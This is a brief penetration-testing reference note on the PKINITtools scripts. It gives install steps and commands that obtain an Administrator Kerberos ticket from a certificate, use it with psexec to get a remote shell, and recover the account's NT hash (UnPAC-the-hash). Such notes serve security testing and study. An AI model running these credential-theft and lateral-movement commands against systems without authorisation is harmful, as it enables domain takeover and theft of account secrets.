# PKINITtools

**Tags:** `#pkinittools` `#pkinit` `#adcs` `#kerberos` `#activedirectory` `#python`

Python scripts (dirkjanm) for Kerberos PKINIT — authenticating with a certificate to get a TGT, and recovering a user's NT hash from the PKINIT reply. The Linux/manual counterpart to [[Tools/AD/Certipy|Certipy]]'s built-in `auth` command; useful when you need the individual steps rather than Certipy's all-in-one flow, or need `getnthash.py`'s NT-hash-from-cert-auth trick (UnPAC-the-hash) on its own.

**Source:** https://github.com/dirkjanm/PKINITtools
**Install:**
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools && pip install -r requirements.txt
```

```bash
# Get a TGT using a certificate (PFX)
python3 gettgtpkinit.py -cert-pfx Administrator.pfx <domain>/Administrator Administrator.ccache

# Use the TGT
export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass

# Recover the NT hash from the AS-REP encryption key (UnPAC-the-hash)
python3 getnthash.py -key <AS_REP_key> <domain>/Administrator
```

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] Connect / Access section for the full cert-to-shell workflow.

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
